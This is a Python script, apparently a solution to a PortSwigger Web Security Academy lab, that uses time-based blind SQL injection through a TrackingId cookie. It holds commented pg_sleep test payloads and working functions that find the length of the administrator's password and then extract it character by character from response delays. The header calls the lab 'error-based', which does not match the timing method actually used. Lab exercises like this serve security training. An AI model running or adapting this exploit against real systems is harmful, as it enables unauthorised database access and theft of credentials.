# Lab: Visible error-based SQL injection
from requests import get
import requests, string, time

URL = "https://0a9b00d503a58ca4801b0d9e000f0008.web-security-academy.net/login"
TID = "PVutL8Sknz4cw1NL"    # => 200 respone
#TID = "PVutL8Sknz4cw1NL'||pg_sleep(10)--"    # => 200 respone - 10sec delay response
#TID = "PVutL8Sknz4cw1NL'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--" # => 200 response - 10sec delay response
#TID = "PVutL8Sknz4cw1NL'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--" # => 200 response - no delay, instant response
#TID = "PVutL8Sknz4cw1NL'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"    # => 200 respone
SESSION = "HAW1ZdXNwRWCzDXE9i8IS5ItFGv7RrCc"
CHARSET = string.ascii_lowercase + string.digits
response=requests.get(URL, cookies={"TrackingId": TID, "session": SESSION})
#print(response.status_code)
#print(response.text)


def delayed(condition):
    payload = (f"';SELECT CASE WHEN ({condition}) "
               f"THEN pg_sleep(8) ELSE pg_sleep(0) END FROM users--")
    r = requests.get(URL, cookies={"TrackingId": payload, "session": SESSION})
    return r.elapsed.total_seconds() > 4
def find_length():
    for n in range(1, 40):
        if not delayed(f"username='administrator' AND LENGTH(password)>{n}"):
            return n
    return None
def extract(length):
    pw = ""
    for i in range(1, length + 1):
        for ch in CHARSET:
            if delayed(f"username='administrator' AND SUBSTRING(password,{i},1)='{ch}'"):
                pw += ch; print(f"[{i}] {ch} -> {pw}"); break
    return pw
n = find_length(); print("len:", n)
print("password:", extract(n))